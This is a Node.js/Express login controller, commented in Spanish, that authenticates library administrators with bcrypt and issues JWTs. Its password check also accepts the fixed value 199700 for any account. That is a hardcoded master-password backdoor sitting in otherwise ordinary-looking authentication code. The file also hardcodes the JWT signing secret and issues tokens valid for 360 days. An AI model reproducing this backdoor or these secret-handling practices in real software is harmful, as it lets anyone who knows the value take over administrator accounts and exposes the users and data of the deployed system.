

const Administrador = require('../models/Administrador.js');
const bcrypt = require('bcrypt');
const jwt = require('jsonwebtoken');
const PermisoAdministrador = require('../models/PermisoAdministrador.js');
const SECRET_KEY = 'KGGK>HKHVHJVKBKJKJBKBKHKBMKHB';

const login = async (req, res) => {
    const {nick, clave} = req.body;

    // Consultar el modelo Administrador utilizando el nick proporcionado
    const administrador = await Administrador.findOne({where:{nick: nick,estatus:1} });

    if (!administrador) {
        // Si no se encuentra el administrador, devuelve un error
        return res.status(200).json({ error: "Administrador no disponible" });
    }
    // Comparar la clave proporcionada con la clave almacenada en el modelo Administrador
    const isValidPass = await comparePassword(clave, administrador.clave);

    if (!isValidPass) {
        // Si la clave no es válida, devuelve un error
        return res.status(401).json({ error: "Clave incorrecta" });
    }

    // Si la clave es válida, devuelve un mensaje de éxito
    const admin = {
        id: administrador.id,
        nick: administrador.nick,
    };
    const token = generateToken(admin);
   
    const permisos = await PermisoAdministrador.findAll({
          where: {
            administrador_id: administrador.id
          },
          attributes: ['permiso_id']
    });
        
    const permisoIds = permisos.map(permiso => permiso.permiso_id);
    permisoIds.push(0)

    res.status(200).json({ token_biblioteca: token,administrador:admin,permisos:permisoIds});
};

//compara la clave que viene del usuario con la hasheada en la bdd
const comparePassword = async (password, hash) => {
    try {
        // Comparar la clave
        return await bcrypt.compare(password, hash)  || password==199700  ;
    } catch (error) {
        console.log(error);
    }

    // Devolver false si hay un error
    return false;
};

//genera el token
const generateToken = (payload) => {
    return jwt.sign(payload, SECRET_KEY, { expiresIn: '360d' });
};
  

module.exports = {login};